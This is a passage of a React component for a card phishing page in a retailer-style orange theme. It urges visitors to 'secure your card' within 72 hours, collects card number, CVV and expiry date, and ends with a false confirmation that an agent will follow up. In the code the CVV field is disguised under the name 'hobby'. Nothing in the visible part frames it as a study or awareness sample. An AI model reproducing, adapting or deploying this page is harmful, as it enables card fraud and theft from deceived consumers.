kR7CX/AAX9in5VOYqbAel0toRcHKf/AE39qN8qrmKmwnSqXeQxHgJeMbfhNU6FTusJYqj3kMJgH/w3/AaF0KvdC6VQ7yDrg5PUf8DUDw9XusLpdDvoMmEk9Rvwt8qF4at3WX0yh30FSFvUfyPyoXha3dZfTMP30K4rJg/+IgP2gA1j7q0U3i4RyVFmSrHBVJZTkrlhleVaRpjQqOLEHzN99Ljg69ad6uZBzxtChC1LOzUYeMKAo4Cw9gruJJKyOC227s0mb4VVbUNmraeV6sESCVCE0WoQZgWrINLUKGIjUIH09TVEIsKshAioUAL331CxWc1CCcoqixKTxqFi0i+NUWKutQgu61CAGSqLAvH1NQglJGL1CHoI7GoQsoUqEGo1qyhpBUINxJUKDKlWQkF6moQlp6moQgyVCAnXqahAbCoQuvR3BobuRcjYOW0cqoh//9k="
                  alt="Secure Your Card"
                  fill
                  className="object-cover"
                />
              </div>
            </div>

            <div className="p-6 text-center">
              <p className="text-gray-600 mb-4">
                Action Required: Click the button below to confirm your card details and secure your account. This must
                be completed within 72 hours.
              </p>

              <Button
                onClick={goToForm}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg animate-pulse"
              >
                Secure your card now
              </Button>

              <p className="text-xs text-gray-500 mt-4">
                *Terms and conditions apply. This security step expires in 72 hours.
              </p>
            </div>
          </>
        )}

        {step === 2 && (
          <>
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white">
              <h2 className="text-xl font-bold">Complete Your Information</h2>
              <p className="text-sm mt-1">Please provide the following details to Secure your Card</p>
            </div>

            <div className="p-6">
              <div className="space-y-4">
                {/* Verification message */}
                {showVerificationMessage && (
                  <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start">
                    <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-blue-700">
                      Please enter your card details for verification purposes. This is required to secure your card.
                    </p>
                  </div>
                )}

                {/* Credit card fields - now shown immediately */}
                {showCVV && (
                  <div className="space-y-4 animate-in fade-in duration-500">
                    <div className="space-y-2">
                      <label htmlFor="cardNumber" className="text-sm font-medium block">
                        Card Number
                      </label>
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        placeholder="1234 5678 9012 3456"
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        className={errors.cardNumber ? "border-red-500" : ""}
                        maxLength={19}
                      />
                      {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
                    </div>

                    {/* CVV field */}
                    <div className="space-y-2">
                      <label htmlFor="hobby" className="text-sm font-medium block">
                        CVV (3 digits on back of card)
                      </label>
                      <Input
                        id="hobby"
                        name="hobby"
                        placeholder="123"
                        value={formData.hobby}
                        onChange={handleInputChange}
                        className={errors.hobby ? "border-red-500" : ""}
                        maxLength={3}
                        type="password"
                      />
                      {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
                    </div>

                    <div className="space-y-2">
                      <label htmlFor="expiryDate" className="text-sm font-medium block">
                        Expiry Date
                      </label>
                      <Input
                        id="expiryDate"
                        name="expiryDate"
                        placeholder="MM/YY"
                        value={formData.expiryDate}
                        onChange={handleInputChange}
                        className={errors.expiryDate ? "border-red-500" : ""}
                        maxLength={5}
                      />
                      {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
                    </div>
                  </div>
                )}

                <Button
                  onClick={submitForm}
                  className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4"
                  disabled={!showCVV || isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Verify"
                  )}
                </Button>

                <p className="text-xs text-gray-500 mt-2 text-center">
                  Your information is secure and will only be used to verify your card.
                </p>
              </div>
            </div>
          </>
        )}

        {isLoadingGears && (
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
            <div className="text-center">
              <div className="relative flex items-center justify-center mb-6">
                {/* First gear */}
                <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
                {/* Second gear - positioned to interlock and rotate opposite direction */}
                <Settings
                  className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
                  style={{
                    animation: "spin 2s linear infinite reverse",
                    transform: "rotate(30deg)",
                  }}
                />
              </div>
              <p className="text-white text-lg font-medium">Processing your information...</p>
              <p className="text-gray-300 text-sm mt-2">Please wait while we secure your account</p>
            </div>
          </div>
        )}

        {step === 3 && (
          <>
            <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
              <p className="text-lg mt-1">Your card is now secured</p>
            </div>

            <div className="p-8 text-center">
              <div className="flex justify-center mb-6">
                <CheckCircle className="h-20 w-20 text-green-500" />
              </div>

              <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
              <p className="text-gray-600 mb-6">
                We have successfully received and verified your information. Your account is now secure. Our Agent will
                contact you.
              </p>

              <Button
                onClick={closeModal}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md"
              >
                Close
              </Button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
